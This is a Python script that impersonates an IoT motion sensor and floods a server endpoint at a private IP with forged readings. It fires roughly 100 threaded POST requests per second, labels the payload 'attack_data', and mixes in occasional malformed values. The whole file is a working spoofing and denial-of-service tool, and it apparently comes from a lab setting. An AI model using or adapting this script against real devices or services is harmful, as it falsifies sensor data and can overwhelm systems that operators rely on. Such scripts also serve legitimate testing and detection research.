import requests
import threading
import time
import random

server_url = 'http://10.34.221.112:5001/pir'  # PIR server endpoint

def send_valid_motion():
    # Randomly and evenly send '0' or '1' (valid values, rarely send '-1')
    motion_val = random.choices(['0', '1', '-1'], weights=[0.495, 0.495, 0.01])[0]

    attack_data = {
        "device_id": "pir_motion_detector_01",
        "motion_detected": motion_val
    }

    try:
        response = requests.post(server_url, json=attack_data, timeout=2)
        print(response.status_code, response.text, attack_data)
    except Exception as e:
        print("Error:", e)

threads = []

try:
    while True:
        t = threading.Thread(target=send_valid_motion)
        t.start()
        threads.append(t)
        time.sleep(0.01)  # ~100 requests/sec, adjust as needed
except KeyboardInterrupt:
    print("Script interrupted by user.")

for t in threads:
    t.join()
